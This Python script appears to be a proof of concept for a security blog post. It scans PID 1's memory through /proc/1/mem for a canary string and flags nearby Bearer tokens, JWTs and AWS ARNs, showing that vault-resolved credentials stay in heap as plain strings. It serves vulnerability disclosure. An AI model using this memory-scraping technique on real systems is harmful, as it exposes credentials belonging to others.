"""Blog demo — search /proc/1/mem for a specific canary string.

Shows raw memory addresses and surrounding context for each hit.
Designed to produce the "this is what the credential looks like in
PID 1's heap" screenshot for the blog.

Env:
  CANARY — string to search for in PID 1's memory. Required.

Hosted at github.com/nivmorabin/skills/dict-walk/pid1_canary_search.py
"""
import os
import re
import sys


def main():
    canary = os.environ.get('CANARY', '')
    if not canary:
        print('ERROR: set CANARY env var')
        sys.exit(1)

    canary_bytes = canary.encode('utf-8')
    print(f'CANARY: {canary}')
    print(f'LENGTH: {len(canary_bytes)} bytes')
    print()

    # Enumerate readable regions
    regions = []
    for line in open('/proc/1/maps').readlines():
        parts = line.split()
        if len(parts) < 2 or 'r' not in parts[1]:
            continue
        try:
            start_s, end_s = parts[0].split('-')
            lo, hi = int(start_s, 16), int(end_s, 16)
            if 4096 <= hi - lo <= 50 * 1024 * 1024:
                regions.append((lo, hi))
        except:
            continue

    print(f'Scanning {len(regions)} readable regions in /proc/1/mem...')
    print()

    # Exclude patterns: hits that are just our shell command echoed in
    # conversation buffers. We want vault-resolution artifacts only.
    exclude_markers = [b'CANARY=', b'canary_search', b'curl -sL', b'python3\\']

    all_hits = []
    hits = []
    with open('/proc/1/mem', 'rb') as mem:
        for lo, hi in regions:
            try:
                mem.seek(lo)
                chunk = mem.read(hi - lo)
            except (OSError, OverflowError):
                continue
            idx = -1
            while True:
                idx = chunk.find(canary_bytes, idx + 1)
                if idx < 0:
                    break
                addr = lo + idx
                # Context: 60 bytes before, canary, 100 bytes after
                ctx_start = max(0, idx - 60)
                ctx_end = min(len(chunk), idx + len(canary_bytes) + 100)
                raw = chunk[ctx_start:ctx_end]
                # Make printable (dots for non-ASCII)
                printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in raw)
                canary_offset = idx - ctx_start
                entry = {
                    'addr': addr,
                    'printable': printable,
                    'canary_offset': canary_offset,
                    'has_bearer': b'Bearer' in raw or b'bearer' in raw,
                    'has_jwt': b'eyJ' in raw,
                    'has_arn': b'arn:aws' in raw,
                    'is_echo': any(marker in raw for marker in exclude_markers),
                }
                all_hits.append(entry)
                if not entry['is_echo']:
                    hits.append(entry)

    echo_count = len(all_hits) - len(hits)
    if echo_count:
        print(f'(filtered {echo_count} command-echo hits)')

    print(f'TOTAL HITS: {len(hits)}')
    bearer_hits = sum(1 for h in hits if h['has_bearer'])
    jwt_hits = sum(1 for h in hits if h['has_jwt'])
    arn_hits = sum(1 for h in hits if h['has_arn'])
    print(f'  with "Bearer" nearby: {bearer_hits}')
    print(f'  with JWT (eyJ...) nearby: {jwt_hits}')
    print(f'  with ARN nearby: {arn_hits}')
    print()
    print('=' * 70)
    print('RAW MEMORY HITS (first 10)')
    print('=' * 70)

    for i, hit in enumerate(hits[:10]):
        print(f'\n[{i}] address: {hex(hit["addr"])}')
        ctx = hit['printable']
        # Show context with the canary highlighted via markers
        before = ctx[:hit['canary_offset']]
        match = ctx[hit['canary_offset']:hit['canary_offset']+len(canary_bytes)]
        after = ctx[hit['canary_offset']+len(canary_bytes):]
        print(f'    ...{before}[>>>{match}<<<]{after}...')
        tags = []
        if hit['has_bearer']:
            tags.append('BEARER')
        if hit['has_jwt']:
            tags.append('JWT')
        if hit['has_arn']:
            tags.append('ARN')
        if tags:
            print(f'    tags: {", ".join(tags)}')

    # Show specifically the Bearer-adjacent hits (most interesting for blog)
    bearer_adjacent = [h for h in hits if h['has_bearer'] or h['has_jwt']]
    if bearer_adjacent:
        print()
        print('=' * 70)
        print(f'CREDENTIAL-ADJACENT HITS ({len(bearer_adjacent)} with Bearer/JWT nearby)')
        print('=' * 70)
        for i, hit in enumerate(bearer_adjacent[:5]):
            print(f'\n[{i}] address: {hex(hit["addr"])}')
            ctx = hit['printable']
            before = ctx[:hit['canary_offset']]
            match = ctx[hit['canary_offset']:hit['canary_offset']+len(canary_bytes)]
            after = ctx[hit['canary_offset']+len(canary_bytes):]
            print(f'    ...{before}[>>>{match}<<<]{after}...')

    print()
    print('=' * 70)
    print('CONCLUSION')
    print('=' * 70)
    print()
    if hits:
        print(f'  The string "{canary}" appears {len(hits)} times in PID 1 heap.')
        if bearer_hits or jwt_hits:
            print(f'  {bearer_hits + jwt_hits} of those are adjacent to credential bytes.')
            print(f'  The vault-resolved token is sitting right next to its provider name.')
        print()
        print(f'  This is a credential the customer NEVER held locally.')
        print(f'  It was resolved by resolve_header_references() at invoke time')
        print(f'  and left in PID 1 heap as a plain Python string.')
    else:
        print(f'  Canary "{canary}" not found in PID 1 heap.')
        print(f'  Run Cell 2 first to trigger a legitimate MCP call.')


if __name__ == '__main__':
    main()
